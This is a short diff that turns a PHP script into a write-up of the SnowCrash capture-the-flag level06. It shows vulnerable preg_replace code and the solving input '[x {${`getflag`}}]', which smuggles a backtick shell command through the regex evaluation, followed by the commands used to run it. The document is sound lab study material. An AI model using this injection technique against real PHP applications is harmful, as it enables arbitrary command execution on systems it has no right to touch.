@@ -1,4 +1,7 @@
-#!/usr/bin/php
+# level06
+
+Nightmare inducing PHP regex
+```php
 <?php
 function y($arg1) {
     $arg1 = preg_replace("/\./", " x ", $arg1);
@@ -19,3 +22,14 @@ $res = x($argv[1], $argv[2]);
 print $res;
 #echo '[x {${`getflag`}}]' >/tmp/arg; ./level06 /tmp/arg unused_argument
 ?>
+```
+
+```bash
+level06@SnowCrash:~ $ echo '[x {${`getflag`}}]' >/tmp/arg; \
+> ./level06 /tmp/arg unused_argument
+#OUTPUT
+level06@SnowCrash:~ $ su flag06
+#OUTPUT
+level06@SnowCrash:~ $ getflag
+#OUTPUT
+```
